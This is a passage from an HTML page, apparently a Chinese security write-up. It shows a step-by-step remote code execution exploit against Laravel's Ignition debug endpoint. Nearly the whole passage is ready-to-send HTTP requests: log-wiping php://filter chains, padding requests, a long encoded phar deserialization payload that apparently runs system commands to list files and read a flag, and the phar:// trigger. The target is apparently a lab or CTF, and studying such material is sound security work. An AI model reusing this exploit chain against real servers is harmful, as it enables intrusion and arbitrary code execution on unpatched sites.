class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span>a
</pre></div>
<p>清空日志</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/_ignition/execute-solution</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>


<span class="p">{</span> <span class="nt">"solution"</span><span class="p">:</span> <span class="s2">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="p">,</span> <span class="nt">"parameters"</span><span class="p">:</span> <span class="p">{</span> <span class="nt">"variableName"</span><span class="p">:</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nt">"viewFile"</span><span class="p">:</span> <span class="s2">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="p">}</span> <span class="p">}</span>
</pre></div>
<p>发送如下数据包，给Log增加一次前缀，用于对齐：</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/_ignition/execute-solution</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">139.xxx:8080</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">155</span>


<span class="p">{</span> <span class="nt">"solution"</span><span class="p">:</span> <span class="s2">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="p">,</span> <span class="nt">"parameters"</span><span class="p">:</span> <span class="p">{</span> <span class="nt">"variableName"</span><span class="p">:</span><span class="s2">"username"</span><span class="p">,</span> <span class="nt">"viewFile"</span><span class="p">:</span> <span class="s2">"AA"</span> <span class="p">}</span> <span class="p">}</span>
</pre></div>
<p>将POC作为viewFile的值，发送数据包</p>
<div class="highlight"><pre><span></span><span class="p">{</span> <span class="nt">"solution"</span><span class="p">:</span> <span class="s2">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="p">,</span> <span class="nt">"parameters"</span><span class="p">:</span> <span class="p">{</span> <span class="nt">"variableName"</span><span class="p">:</span><span class="s2">"username"</span><span class="p">,</span> <span class="nt">"viewFile"</span><span class="p">:</span> <span class="s2">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=62=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=6C=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4E=00=44=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=4B=00=43=00=64=00=73=00=63=00=79=00=41=00=76=00=4A=00=79=00=6B=00=37=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=4B=00=43=00=64=00=6A=00=59=00=58=00=51=00=67=00=4C=00=32=00=5A=00=73=00=59=00=57=00=63=00=75=00=64=00=48=00=68=00=30=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=49=00=78=00=34=00=76=00=5A=00=77=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=73=00=52=00=38=00=57=00=51=00=34=00=61=00=4C=00=73=00=37=00=61=00=45=00=70=00=65=00=54=00=5A=00=7A=00=52=00=43=00=33=00=66=00=4B=00=2B=00=69=00=55=00=53=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a"</span> <span class="p">}</span> <span class="p">}</span>
</pre></div>
<p>发送如下数据包，清空对log文件中的干扰字符，只留下POC：</p>
<div class="highlight"><pre><span></span><span class="p">{</span> <span class="nt">"solution"</span><span class="p">:</span> <span class="s2">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="p">,</span> <span class="nt">"parameters"</span><span class="p">:</span> <span class="p">{</span> <span class="nt">"variableName"</span><span class="p">:</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nt">"viewFile"</span><span class="p">:</span> <span class="s2">"phar:///var/www/storage/logs/laravel.log/test.txt"</span> <span class="p">}</span> <span class="p">}</span>
</pre></div>
<p>使用phar://进行反序列化，执行任意代码（此时需要使用绝对路径）</p>
<div class="highlight"><pre><span></span><span class="p">{</span> <span class="nt">"solution"</span><span class="p">:</span> <span class="s2">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="p">,</span> <span class="nt">"parameters"</span><span class="p">:</span> <span class="p">{</span> <span class="nt">"variableName"</span><span class="p">:</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nt">"viewFile"</span><span class="p">:</span> <span class="s2">"phar://../storage/logs/laravel.log/test.txt"</span> <span class="p">}</span> <span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180624-46ca6c84-9e82-1.png"/></p>
</div>
</div>